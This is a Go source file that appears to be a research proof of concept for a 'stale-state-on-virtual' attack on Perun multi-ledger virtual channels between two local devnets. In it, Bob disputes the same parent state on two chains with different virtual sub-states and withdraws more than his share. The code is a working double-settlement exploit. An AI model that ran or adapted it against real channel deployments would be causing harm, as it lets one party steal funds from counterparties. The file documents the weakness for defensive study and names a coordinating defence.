// Copyright 2026 - See NOTICE file for copyright holders.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"context"
	"fmt"
	"log"
	"math/big"
	"time"

	"perun.network/go-perun/channel"
	pclient "perun.network/go-perun/client"
	"perun.network/go-perun/wallet"

	"perun-multiledger-poc/multiledger-channel/client"
)

// runAttack performs the stale-state-on-virtual attack on an all-Ethereum
// multi-ledger virtual channel (the CKB-free counterpart of
// multiledger-virtual-ckb-eth). With NO coordinator, Bob disputes the Bob-Hub
// parent at the SAME parent state on both chains but embeds a DIFFERENT virtual
// sub-state on each — vc1 on chain A (Bob 8), vc0 on chain B (Bob 5). Each chain
// folds its locally registered version, so V settles divergently and pays Bob
// more than any single consistent version would. The recursive CoordinateVC
// defence in multiledger-virtual-coordinated pins one virtual version on both
// chains and prevents it.
//
// autoWatch is disabled here (see setupSwapClient): a live watcher would
// re-register the tree and re-sync both chains to one virtual version.
func runAttack(
	ctx context.Context,
	bob, hub *client.SwapClient,
	chBobHub, chHubBob *client.SwapChannel, // only the Bob-Hub parent is disputed
	chAliceBob, chBobAlice *client.SwapChannel,
) {
	// Capture V's initial agreed state vc0 (both parties signed it at open:
	// chain A [5,5], chain B [5,5]).
	ss0 := signedStateOf(chBobAlice.Channel())
	log.Printf("[attack] captured virtual state vc0 (v%d): chain A %v, chain B %v.",
		ss0.State.Version, ss0.State.Balances[0], ss0.State.Balances[1])

	// Advance V to a later co-signed state vc1 via an off-chain virtual update:
	// Alice pays Bob 3 on chain A, Bob pays Alice 3 on chain B. Both parties sign
	// vc1, so Bob legitimately holds witnesses for BOTH vc0 and vc1.
	virtualV1 := channel.Balances{
		{big.NewInt(2), big.NewInt(8)}, // chain A: Alice 2, Bob 8.
		{big.NewInt(8), big.NewInt(2)}, // chain B: Alice 8, Bob 2.
	}
	log.Println("[attack] advancing virtual channel to vc1 (cross-chain swap).")
	if err := chAliceBob.UpdateBalances(ctx, virtualV1); err != nil {
		log.Fatalf("[attack] virtual v1 update: %v", err)
	}
	time.Sleep(300 * time.Millisecond) //nolint:mnd // let both peers persist v1.
	ss1 := signedStateOf(chBobAlice.Channel())
	log.Printf("[attack] captured virtual state vc1 (v%d): chain A %v, chain B %v.",
		ss1.State.Version, ss1.State.Balances[0], ss1.State.Balances[1])

	// Bob-Hub agreed adjudicator requests. The PARENT state is identical on both
	// chains — only the embedded virtual sub-state diverges. Bob proposed Bob-Hub,
	// so Bob is index 0 and Hub is index 1.
	parentReqBob := pclient.NewTestChannel(chBobHub.Channel()).AdjudicatorReq()
	parentReqHub := pclient.NewTestChannel(chHubBob.Channel()).AdjudicatorReq()
	// Bob is the primary disputer on both chains: he registers Bob-Hub and his
	// withdraw concludes it. Hub only collects its own share, so it withdraws as
	// secondary (the conclude already happened under Bob's primary withdraw).
	parentReqHub.Secondary = true

	// Per-chain withdrawal sub-state maps: chain A folds vc1, chain B folds vc0.
	smap1 := channel.MakeStateMap()
	smap1.Add(ss1.State)
	smap0 := channel.MakeStateMap()
	smap0.Add(ss0.State)

	// Step 1: chain A — register Bob-Hub carrying the NEWER virtual state vc1
	// (Bob's chain-A-favoured version: Bob 8).
	log.Printf("[attack] step 1: register Bob-Hub on chain A with virtual vc1 (v%d).", ss1.State.Version)
	if err := bob.Adjudicator(0).Register(ctx, parentReqBob, []channel.SignedState{ss1}); err != nil {
		log.Fatalf("[attack] chain A register: %v", err)
	}

	// Step 2: chain B — register the SAME Bob-Hub carrying the STALE virtual state
	// vc0 (Bob's chain-B-favoured version: Bob 5).
	log.Printf("[attack] step 2: register Bob-Hub on chain B with virtual vc0 (v%d).", ss0.State.Version)
	if err := bob.Adjudicator(1).Register(ctx, parentReqBob, []channel.SignedState{ss0}); err != nil {
		log.Fatalf("[attack] chain B register: %v", err)
	}

	// Wait out both chains' dispute windows in wall-clock time. The windows are
	// block.timestamp based and both devnets mine every 500 ms, so the timers
	// advance in real time and each parent's conclude becomes available during
	// Withdraw — no manual evm_increaseTime.
	waitChallenge(challengeDuration)

	// Step 3: each chain pays out Bob-Hub folding its locally registered virtual
	// state — chain A at vc1 (Bob 8), chain B at vc0 (Bob 5).
	log.Println("[attack] both dispute windows elapsed — withdrawing divergently.")
	if err := bob.Adjudicator(0).Withdraw(ctx, parentReqBob, smap1); err != nil {
		log.Fatalf("[attack] Bob chain A withdraw: %v", err)
	}
	if err := hub.Adjudicator(0).Withdraw(ctx, parentReqHub, smap1); err != nil {
		log.Fatalf("[attack] Hub chain A withdraw: %v", err)
	}
	if err := bob.Adjudicator(1).Withdraw(ctx, parentReqBob, smap0); err != nil {
		log.Fatalf("[attack] Bob chain B withdraw: %v", err)
	}
	if err := hub.Adjudicator(1).Withdraw(ctx, parentReqHub, smap0); err != nil {
		log.Fatalf("[attack] Hub chain B withdraw: %v", err)
	}

	fmt.Println()
	fmt.Println("============================================================")
	fmt.Println("  STALE-STATE-ON-VIRTUAL ATTACK (ETH<->ETH) — OUTCOME")
	fmt.Println("============================================================")
	fmt.Println("  Bob-Hub parent disputed with the SAME parent state but a")
	fmt.Println("  DIFFERENT embedded virtual sub-state on each chain:")
	fmt.Printf("    chain A folded the virtual at vc1 (v%d): Bob 8\n", ss1.State.Version)
	fmt.Printf("    chain B folded the virtual at vc0 (v%d): Bob 5\n", ss0.State.Version)
	fmt.Println("  Bob banked 8 + 5 = 13 PRN across the two chains, vs the 10")
	fmt.Println("  any single consistent version yields (v0: 5+5, v1: 8+2).")
	fmt.Println("  Result: ATTACK SUCCEEDED — divergent settlement; Bob nets +3,")
	fmt.Println("  Alice is short-changed, Hub absorbs the shortfall.")
	fmt.Println("  No coordinator observed the virtual sub-state. The recursive")
	fmt.Println("  CoordinateVC defence (multiledger-virtual-coordinated) pins a")
	fmt.Println("  single virtual version on both chains and prevents this.")
	fmt.Println("============================================================")
}

// signedStateOf snapshots a channel's current co-signed state (params + state +
// signatures) as a channel.SignedState, cloning so later updates to the channel
// do not mutate the captured snapshot.
func signedStateOf(ch *pclient.Channel) channel.SignedState {
	req := pclient.NewTestChannel(ch).AdjudicatorReq()
	return channel.SignedState{
		Params: req.Params,
		State:  req.Tx.State.Clone(),
		Sigs:   append([]wallet.Sig(nil), req.Tx.Sigs...),
	}
}

// waitChallenge waits out a dispute window in wall-clock time. Both Hardhat
// devnets mine every 500 ms, so block.timestamp advances in real time and each
// parent's conclude becomes available during Withdraw — no evm_increaseTime.
func waitChallenge(seconds uint64) {
	d := time.Duration(seconds+2) * time.Second
	log.Printf("[attack] waiting %s for both chains' challenge windows…", d)
	time.Sleep(d)
}
